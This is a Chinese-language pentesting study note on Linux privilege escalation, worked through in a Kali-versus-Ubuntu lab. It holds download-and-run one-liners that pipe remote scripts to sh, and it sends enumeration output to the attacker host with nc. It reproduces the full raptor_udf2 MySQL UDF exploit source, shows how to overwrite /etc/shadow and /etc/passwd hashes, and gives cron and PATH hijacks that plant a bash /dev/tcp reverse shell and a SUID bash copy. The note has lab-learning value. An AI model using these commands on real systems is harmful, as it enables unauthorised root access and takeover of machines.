# 前置

## kali关闭休眠

[Kali Linux 禁止自动休眠功能-Mr_God的博客](https://www.mrgod.cn/109.html#:~:text=关闭Kali Linux 系统的自动息屏，休眠功能 1 进入 kali linux 后点击kali图标--->,Switch off after 全部设置成为 Never 这样就把kali linux 的睡眠功能给禁用了。)

## 提升 shell 的交互性

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
stty raw -echo
```

```bash
export TERM=xterm-color
```

使用 `rlwrap` 包裹 `nc`，得到 shell 后可以用上下翻键找到历史记录

```bash
rlwrap nc -lvnp 4444
```

## 手动枚举

1、查看当前用户与系统基础信息

```bash
whoami
id
id root
who
w
last
uname -a
lsb_release -a
cat /proc/version
cat /etc/issue
hostnamectl
```

2、查看ip与网卡

```bash
ip addr
ip route
ip neigh
arp -a
ifconfig
```

3、机器信息

```bash
hostname
```

4、查看当前用户可以以root身份执行哪些程序

```bash
sudo -l
```

5、得到根目录下的权限能力

```bash
getcap -r / 2>/dev/null
```

6、其它

```bash
ls -a
ls -liah
history
cat /etc/passwd
cat /etc/crontab  #计划任务
echo $PATH  #环境变量
env
ps -ef  #进程
ps axjf
ps aux 
top
top -n 1
netstat -a  #网络连接情况
netstat -au    #udp
netstat -at  #tcp
netstat -l
netstat -ano
find / -perm -u=x -type f 2>/dev/null #有s位的可执行文件
which awk perl python ruby vu vim nmap find nc wget   tftp ftp tmux screen 2>/dev/null #查看安装了哪些程序
cat /etc/fstab #检测未挂载的磁盘
```

# 自动化枚举

## 工具脚本

排名由好到低

```http
https://github.com/carlospolop/PEASS-ng
```

```http
https://github.com/rebootuser/LinEnum
```

```http
https://github.com/diego-treitos/linux-smart-enumeration
```

```http
https://github.com/The-Z-Labs/linux-exploit-suggester
```

```http
https://github.com/sleventyeleven/linuxprivchecker
    // python写的
```

```http
https://github.com/pentestmonkey/unix-privesc-check
  // pentestmonkey 巨佬分享了很多文章
```

## 执行技巧

Linpeas示例

1、下载执行

```http
https://github.com/carlospolop/PEASS-ng/releases/download/20230528-732e358b/linpeas.sh
```

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20230528-732e358b/linpeas.sh

chmod +x linpeas.sh 
./linpeas.sh
```

2、远程执行

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20230528-732e358b/linpeas.sh | sh
```

3、远程执行（不出网情况）

攻击机先开一个小型服务器，放上 Linpeas，在远程执行

```bash
curl http://192.168.0.103:8088/linpeas.sh | sh
```

4、把执行结果传回攻击机 kali

kali开启web服务，并且开启nc监听

```bash
sudo python -m http.server 8088
sudo nc -lvnp 81 | tee linpeas.txt
```

ubuntu远程执行Linpeas并把结果用nc传输到kali

```bash
curl http://192.168.0.103:8088/linpeas.sh | sh | nc 192.168.0.103 81
```

kali 查看 结果

```bash
less -r linpeas.txt 
```

5、 curl 不能用时

kali 把 linpeas 用 nc 传到 88 端口里

```bash
sudo nc -lvnp 88 < linpeas.sh
```

ubuntu 远程执行执行

```bash
cat < /dev/tcp/192.168.0.103/88 | sh
```

# MySQL的UDF提权

## 原理

mysql  用户自定义函数的提权，udf中自定义一些以高权限执行系统命令的函数，再将该函数导入到 mysql 的数据库中，通过 mysql 数据库以高权限执行系统命令获得提权。实际上就是以 mysql 能够执行系统命令的方式，在mysql中修改，以root方式执行

## 操作

```
searchsploit mysql udf
locate linux/local/1518.c
```

```bash
cat /usr/share/exploitdb/exploits/linux/local/1518.c

/*
 * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $
 *
 * raptor_udf2.c - dynamic library for do_system() MySQL UDF
 * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This is an helper dynamic library for local privilege escalation through
 * MySQL run with root privileges (very bad idea!), slightly modified to work
 * with newer versions of the open-source database. Tested on MySQL 4.1.14.
 *
 * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c
 *
 * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes
 * for the security vulnerabilities in the handling of User Defined Functions
 * (UDFs) reported by Stefano Di Paola <stefano.dipaola@wisec.it>. For further
 * details, please refer to:
 *
 * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html
 * http://www.wisec.it/vulns.php?page=4
 * http://www.wisec.it/vulns.php?page=5
 * http://www.wisec.it/vulns.php?page=6
 *
 * "UDFs should have at least one symbol defined in addition to the xxx symbol
 * that corresponds to the main xxx() function. These auxiliary symbols
 * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and
 * xxx_add() functions". -- User Defined Functions Security Precautions
 *
 * Usage:
 * $ id
 * uid=500(raptor) gid=500(raptor) groups=500(raptor)
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 * $ mysql -u root -p
 * Enter password:
 * [...]
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
 * mysql> \! sh
 * sh-2.05b$ cat /tmp/out
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
 * [...]
 *
 * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys
 *
 */

#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
        unsigned int            arg_count;      // number of arguments
        enum Item_result        *arg_type;      // pointer to item_result
        char                    **args;         // pointer to arguments
        unsigned long           *lengths;       // length of string args
        char                    *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
        char                    maybe_null;     // 1 if func can return NULL
        unsigned int            decimals;       // for real functions
        unsigned long           max_length;     // for string functions
        char                    *ptr;           // free ptr for func data
        char                    const_item;     // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
        if (args->arg_count != 1)
                return(0);

        system(args->args[0]);

        return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
        return(0);
}

// milw0rm.com [2006-02-20] 
```

# linux权限

<img src=".\图片\df98783f62844f379895e545441e5292_tplv-k3u1fbpfcp-zoom-in-crop-mark_4536_0_0_0.png" alt="df98783f62844f379895e545441e5292_tplv-k3u1fbpfcp-zoom-in-crop-mark_4536_0_0_0" style="zoom:80%;" />

<img src=".\图片\5dc4fc7e21114238b73a01b90f38f398_tplv-k3u1fbpfcp-zoom-in-crop-mark_4536_0_0_0.png" alt="5dc4fc7e21114238b73a01b90f38f398_tplv-k3u1fbpfcp-zoom-in-crop-mark_4536_0_0_0" style="zoom:80%;" />



[看完这篇 Linux 权限后，通透了！ - 掘金 (juejin.cn)](https://juejin.cn/post/7047482882582904862)

[(150条消息) Linux权限详解（chmod、600、644、700、711、755、777、4755、6755、7755）_chmod700_林20的博客-CSDN博客](https://blog.csdn.net/u013197629/article/details/73608613)

Linux的文件权限有以下设定：

Linux下文件的权限类型一般包括读，写，执行。对应字母为 r、w、x。
Linux下权限的属组有 **拥有者 、群组 、其它组** 三种。每个文件都可以针对这三个属组（粒度），设置不同的rwx(读写执行)权限。
通常情况下，一个文件只能归属于一个用户和组， 如果其它的用户想有这个文件的权限，则可以将该用户加入具备权限的群组，一个用户可以同时归属于多个组。

十位权限表示
常见的权限表示形式有：

```
-rw------- (600)    只有拥有者有读写权限。
-rw-r--r-- (644)    只有拥有者有读写权限；而属组用户和其他用户只有读权限。
-rwx------ (700)    只有拥有者有读、写、执行权限。
-rwxr-xr-x (755)    拥有者有读、写、执行权限；而属组用户和其他用户只有读、执行权限。
-rwx--x--x (711)    拥有者有读、写、执行权限；而属组用户和其他用户只有执行权限。
-rw-rw-rw- (666)    所有用户都有文件读、写权限。
-rwxrwxrwx (777)    所有用户都有读、写、执行权限。
```



```
r-- = 100
-w- = 010
--x = 001
--- = 000
```

转换成八进制数，则为 r=4, w=2, x=1, -=0（这也就是用数字设置权限时为何是4代表读，2代表写，1代表执行）

实际上，我们可以将所有的权限用二进制形式表现出来，并进一步转变成八进制数字：

```
rwx = 111 = 7
rw- = 110 = 6
r-x = 101 = 5
r-- = 100 = 4
-wx = 011 = 3
-w- = 010 = 2
--x = 001 = 1
--- = 000 = 0
```

故 如果我们将每个属组的权限都用八进制数表示，则文件的权限可以表示为三位八进制数

```cobol
-rw------- =  600
-rw-rw-rw- =  666
-rwxrwxrwx =  777
```

# 提权方法

## 可读shadow文件利用

1、root用户赋予可读权限

```bash
┌──(root💀kali)-[~]
└─# chmod +u /etc/shadow
```

2、kali用户查看shadow权限

```bash
┌──(kali㉿kali)-[~]
└─$ ls -liah /etc/shadow
3413576 -rw-r--r-- 1 root shadow 1.8K May 20 01:35 /etc/shadow
```

3、kali用户提取hash

```bash
┌──(kali㉿kali)-[~]
└─$ cat /etc/shadow | grep ':\$'
root:$y$j9T$FhuDojGu2WxsFJMNVNfR10$8JXAjJHPzbmGS8tGFYwHVEecQMz.4sEBOZKyXTn5PG9:18903:0:99999:7:::
kali:$y$j9T$B4i9oW2LaERt/J5/X8bbN/$zzGfRqAZim/VofZcas3MhnfSdYddB5.zRulk087PN2A:18878:0:99999:7:::
```

解压字典：

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

4、john 爆破，hash 为 之前kali用户vim提取存入的 hash

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

这里破解不出来，yescrypt 好像不能破解

[/etc/shadow可以破解吗 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/502767105)

[Understanding /etc/shadow file format on Linux - nixCraft (cyberciti.biz)](https://www.cyberciti.biz/faq/understanding-etcshadow-file/)

5、换了一套环境的hash，破解成功

```
root:$6$B2UOTJuK$FhrDXT5b2VnwSOlGJnnrcZz3Yp57Xxj3xffkTwCmIepvnV1TvOdCw8msrCUrpplnaqEOV7PHBJVWBGzOFIKby.:18016:0:99999:7:::
moonteam:$6$JmlEMUxK$1z4jAyPW9M10W4c6T79ly1yO38S9dXWLdj.gflDVsqj4DkhBTMBjLd8u7q5GD4B.SXa4smGrsXZxwJtPNHfRe0:18016:0:99999:7:::
```

<img src=".\图片\Snipaste_2023-05-30_16-39-23.png" alt="Snipaste_2023-05-30_16-39-23" style="zoom: 80%;" />

## 可写shadow文件利用

1、root用户赋予读写权限

语法：

```
sudo chmod u=rwx,g=rw,o=r filename
u：用户
g：组
o：其他
```

[【干货】Linux 修改权限命令 chmod 用法示例 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/355450290)

```bash
┌──(root💀kali)-[~]
└─# chmod o=rw /etc/shadow
```

2、kali用户查看 /etc/shadow 权限

```bash
└─$ ls -liah /etc/shadow
3413576 -rw-r--rw- 1 root shadow 1.8K May 20 01:35 /etc/shadow
```

3、复制备份shadow

```bash
┌──(kali㉿kali)-[~]
└─$ cp /etc/shadow  /tmp/shadow.bak    
```

4、查看当前hash加密方式

[Understanding /etc/shadow file format on Linux - nixCraft (cyberciti.biz)](https://www.cyberciti.biz/faq/understanding-etcshadow-file/)

或者

```bash
┌──(kali㉿kali)-[~]
└─$ hash-identifier '$6$JmlEMUxK$1z4jAyPW9M10W4c6T79ly1yO38S9dXWLdj.gflDVsqj4DkhBTMBjLd8u7q5GD4B.SXa4smGrsXZxwJtPNHfRe0'
```

5、本地密码生成

```bash
┌──(root💀kali)-[~]
└─# mkpasswd -m sha-512 zf1yolo
$6$aw/fs6tKrOtp2yzX$nNXpaKzSFBF2caz8FjvRRk9iCF00rYY2BY7qUp8b/lM3Pz1Gtx.KrvDZI9akUrlE08SNzctH522nevqPiaIwq0
```

6、覆盖到 /etc/shadow 里

换了环境，重置root密码为zf1yolo成功

```bash
moonteam@moonteam-virtual-machine:~$ ls -liah /etc/shadow
1064148 -rw-r--rw- 1 root shadow 1.4K  5月  1  2019 /etc/shadow
moonteam@moonteam-virtual-machine:~$ vim /etc/shadow
moonteam@moonteam-virtual-machine:~$ su
密码： zf1yolo
root@moonteam-virtual-machine:/home/moonteam# cat /etc/shadow | grep root
root:$6$aw/fs6tKrOtp2yzX$nNXpaKzSFBF2caz8FjvRRk9iCF00rYY2BY7qUp8b/lM3Pz1Gtx.KrvDZI9akUrlE08SNzctH522nevqPiaIwq0:18016:0:99999:7:::
```

## 可写passwd文件利用

1、root 用户赋予权限

```bash
root@moonteam-virtual-machine:~# chmod o=rw /etc/passwd
```

2、moonteam 用户查看 passwd 权限

```bash
moonteam@moonteam-virtual-machine:~$ ls -liah /etc/passwd
1064149 -rw-r--rw- 1 0 root 2.3K  5月  1  2019 /etc/passwd
```

3、本地生成 root 的密码

```bash
┌──(kali㉿kali)-[~]
└─$ openssl passwd 123456
$1$/RTBLQ0l$i.Yj51ObSAVwFOV0Vjtq6/
```

4、把密码覆盖 passwd 里的 root 用户的 x 位，于是 root 密码又被我们改为了 123456

```bash
moonteam@moonteam-virtual-machine:~$ vi /etc/passwd
moonteam@moonteam-virtual-machine:~$ su
密码： 123456
root@moonteam-virtual-machine:/home/moonteam# cat /etc/passwd |grep root
root:$1$/RTBLQ0l$i.Yj51ObSAVwFOV0Vjtq6/:0:0:root:/root:/bin/bash
```

## sudo环境变量提权

并非用 find 后面跟参数提权，而是 find 之前就预加载了 LD_PRELOAD，而 shell.so里有我们的提权逻辑 ，权限是继承自 sudo。

<img src=".\图片\Snipaste_2023-05-30_17-13-46.png" alt="Snipaste_2023-05-30_17-13-46" style="zoom:80%;" />

以共享库方式执行

<img src=".\图片\Snipaste_2023-05-30_17-14-26.png" alt="Snipaste_2023-05-30_17-14-26" style="zoom:80%;" />

## 自动任务

### 文件权限提权

#### 环境配置

ubuntu 的 root 用户配置

1、在环境变量下，创建脚本 overwrite.sh

```bash
root@moonteam-virtual-machine:~# vim /usr/local/bin/overwrite.sh
```

```bash
root@moonteam-virtual-machine:~# cat /usr/local/bin/overwrite.sh
#!/bin/bash
echo `date` > tmp/useless
```

赋予执行权限和其它用户读写权限

```bash
root@moonteam-virtual-machine:~# chmod +x /usr/local/bin/overwrite.sh
root@moonteam-virtual-machine:~# chmod o=rw /usr/local/bin/overwrite.sh
```

2、把 overwrite.sh 添加到计划任务

```bash
root@moonteam-virtual-machine:~# cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root overwrite.sh
```

#### 提权复现

1、查看计划任务

```bash
moonteam@moonteam-virtual-machine:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root overwrite.sh
```

2、修改计划任务里的 overwrite.sh 脚本，改为反弹 shell

```bash
moonteam@moonteam-virtual-machine:~$ locate overwrite.sh

moonteam@moonteam-virtual-machine:~$ cat /usr/local/bin/overwrite.sh 
#!/bin/bash
echo `date` > /tmp/useless 

moonteam@moonteam-virtual-machine:~$ ls -liah /usr/local/bin/overwrite.sh
818018 -rwxr-xrw- 1 root root 40  5月 30 17:33 /usr/local/bin/overwrite.sh

moonteam@moonteam-virtual-machine:~$ vim /usr/local/bin/overwrite.sh
moonteam@moonteam-virtual-machine:~$ cat /usr/local/bin/overwrite.sh
#!/bin/bash
bash -i >& /dev/tcp/192.168.0.103/7777 0>&1 
```

3、kali监听，收到 shell 

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 7777
listening on [any] 7777 ...
connect to [192.168.0.103] from (UNKNOWN) [192.168.0.102] 53234
bash: 无法设定终端进程组(90035): 对设备不适当的 ioctl 操作
bash: 此 shell 中无任务控制
root@moonteam-virtual-machine:~# id
id
uid=0(root) gid=0(root) 组=0(root)
```

### PATH环境变量提权

当我们的环境变量里出现如下：

```
/home/moonteam:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

发现 `/home/moonteam` 排在前面，我们就可以重写 `overwrite.sh` 添加到 `/home/moonteam` 里，于是计划任务会优先调用  `/home/moonteam` 里的 `overwrite.sh`

#### 环境配置

root 用户配置，vim 添加 /home/moonteam 到计划任务里的环境变量

```bash
root@moonteam-virtual-machine:~# export PATH=/home/moonteam:$PATH
root@moonteam-virtual-machine:~# echo $PATH
/home/moonteam:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

```bash
root@moonteam-virtual-machine:~# cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/moonteam:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root overwrite.sh

```

#### 操作复现

moonteam操作，重写 overwrite.sh 里添加 反弹 shell

```bash
moonteam@moonteam-virtual-machine:~$ vim overwrite.sh
moonteam@moonteam-virtual-machine:~$ chmod +x overwrite.sh 
moonteam@moonteam-virtual-machine:~$ cat overwrite.sh 
#!/bin/bash
bash -i >& /dev/tcp/192.168.0.103/7777 0>&1 
```

kali 监听

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 7777                                                                                                                                         1 ⨯
listening on [any] 7777 ...
connect to [192.168.0.103] from (UNKNOWN) [192.168.0.102] 53246
bash: 无法设定终端进程组(3639): 对设备不适当的 ioctl 操作
bash: 此 shell 中无任务控制
root@moonteam-virtual-machine:~# 
```



补充下，overwrite.sh 里还可以写入以下内容提权：

```
#!/bin/bash
cp /bin/bash /tmp/zf1yolo
chmod +xs /tmp/zf1yolo
```

moonteam 再执行 `/tmp/zf1yolo -p` 即可提权至 root
